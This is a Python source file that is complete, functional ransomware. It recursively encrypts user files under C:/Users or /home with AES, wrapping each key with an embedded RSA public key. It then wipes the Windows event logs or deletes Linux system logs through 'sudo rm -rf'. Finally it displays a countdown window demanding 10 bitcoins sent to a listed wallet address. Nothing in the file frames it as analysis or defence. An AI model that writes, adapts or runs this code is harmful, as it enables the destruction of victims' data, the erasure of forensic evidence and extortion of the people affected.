import subprocess
from tkinter import Tk, Label, StringVar
import os
import subprocess
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.asymmetric.padding import OAEP, MGF1
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
import secrets
import platform
import sys
from concurrent.futures import ThreadPoolExecutor

PUBLIC_KEY_PEM = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtyJ30jHR1Ooa4MBUe0Wq
2rH3GT3Iyo5IAUEaWIfWzvhDWlFLmXFj1E8EKSo/gosU7B7Bn1lSvtVkYGWs/1Y/
8N0nNNgK+XeBtxa0J0T/+m5a1g1j6+LoZVPcnB0GWmN59wV4ORccZs9qKF2GOGAY
o1WiKnHlOLBlx/XU0n75kqk22s2f1AmEeI0AGe0uXNRnh9aKVQOmbglQQvTao813
NzVI7ltLCdzGILFDde3jDPXXOZqPe9iNVE9aUsVBs996M6Xym0+raQ5GrpBtCaqh
XpdD9jngXqth7KkXyMerh5FrhSaI8CaKKZJpHcSgUy43nmY96aEIPCy341kz1mcu
2QIDAQAB
-----END PUBLIC KEY-----
"""

def encrypt_file(file_path, public_key):
    try:
        aes_key = secrets.token_bytes(32) 
        iv = secrets.token_bytes(16)  

        with open(file_path, "rb") as file:
            file_data = file.read()

        padder = sym_padding.PKCS7(128).padder()
        padded_data = padder.update(file_data) + padder.finalize()

        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        encrypted_key = public_key.encrypt(
            aes_key,
            OAEP(
                mgf=MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            ),
        )

        final_data = encrypted_key + iv + encrypted_data
        with open(file_path, "wb") as file:
            file.write(final_data)

        print(f"File encrypted: {file_path}")
    except Exception as e:
        print(f"Error encrypting file {file_path}: {e}")

def encrypt_file_task(file_path, public_key):
    try:
        encrypt_file(file_path, public_key)
        print(f"Encrypted file: {file_path}")
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")

def encrypt_all_files(start_path, public_key):
    python_install_dir = os.path.dirname(sys.executable)
    script_dir = os.path.dirname(os.path.abspath(__file__))
    excluded_dirs = [
        python_install_dir,
        script_dir,
        "C:/Windows", "C:/Program Files", "C:/Program Files (x86)",
        "C:/$Recycle.Bin", "C:/System Volume Information"
    ]

    files_to_encrypt = []

    # Collect files to encrypt
    for root, dirs, files in os.walk(start_path):
        # Skip excluded directories
        if any(os.path.commonpath([root, ex]) == ex for ex in excluded_dirs):
            continue

        for file in files:
            file_path = os.path.join(root, file)

            # Skip symbolic links and write-protected files
            if os.path.islink(file_path) or not os.access(file_path, os.W_OK):
                continue

            # Skip Python runtime and script files
            if file_path.startswith(python_install_dir) or file_path.startswith(script_dir):
                continue

            files_to_encrypt.append(file_path)

    # Encrypt files in parallel
    with ThreadPoolExecutor(max_workers=8) as executor:
        executor.map(lambda path: encrypt_file_task(path, public_key), files_to_encrypt)


def delete_system_logs():
    if os.name == 'nt':  
        event_log_names = [
            "Application",
            "System",
            "Security",
            "Setup",
            "ForwardedEvents"
        ]
        try:
            for log_name in event_log_names:
                subprocess.run(['wevtutil', 'cl', log_name], check=True)
                print(f"Deleted Windows event log: {log_name}")
        except subprocess.CalledProcessError as e:
            print(f"Error deleting Windows event log {log_name}: {e}")

    elif os.name == 'posix': 
        system_log_paths = [
            "/var/log/syslog",
            "/var/log/auth.log",
            "/var/log/kern.log",
            "/var/log/dmesg",
            "/var/log/messages",
        ]
        for log_path in system_log_paths:
            if os.path.exists(log_path):
                try:
                    subprocess.run(['sudo', 'rm', '-rf', log_path], check=True)
                    print(f"Deleted system log: {log_path}")
                except Exception as e:
                    print(f"Error deleting log {log_path}: {e}")
            else:
                print(f"System log file not found: {log_path}")

def countdown_timer_gui_and_delete_files(hours, minutes, seconds, folder_path):
    def on_close():
        close_warning_label.config(text="Instead of closing the window send 10 bitcoins to the following address: bc1qhfnx6p7anmytz90nyrndy2tf0k2h046psgu8xj")
        
    def update_timer():
        nonlocal total_seconds
        if total_seconds > 0:
            hrs, rem = divmod(total_seconds, 3600)
            mins, secs = divmod(rem, 60)
            timer_var.set(f"{hrs:02}:{mins:02}:{secs:02}")
            total_seconds -= 1
            window.after(1000, update_timer)
        else:
            timer_var.set("Countdown Timer!")

    total_seconds = hours * 60 + minutes * 60 + seconds

    window = Tk()
    window.title("Countdown timer")
    window.geometry("1200x900")

    window.protocol("WM_DELETE_WINDOW", on_close)

    timer_var = StringVar()
    timer_label = Label(window, textvariable=timer_var, font=("Helvetica", 20))
    timer_label.pack(expand=True)

    close_warning_label = Label(window, text="Don't close this window!", font=("Helvetica", 10), fg="red")
    close_warning_label.pack(pady=10)  

    additional_text = Label(window, text="Files will be deleted after the time has elapsed.", font=("Helvetica", 10))
    additional_text.pack()

    update_timer()

    window.mainloop()

if __name__ == "__main__":
    try:
        public_key = load_pem_public_key(PUBLIC_KEY_PEM.encode())
        print("Public key loaded successfully.")
    except Exception as e:
        print(f"Error loading public key: {e}")
        exit(1)

    if platform.system() == 'Windows':
        start_path = "C:/Users"
    elif platform.system() == 'Linux':
        start_path = "/home"
    else:
        print("Unsupported operating system.")
        exit(1)

    encrypt_all_files(start_path, public_key)
    delete_system_logs()

    print("Encryption complete!")
    countdown_timer_gui_and_delete_files(1, 0, 0, start_path)
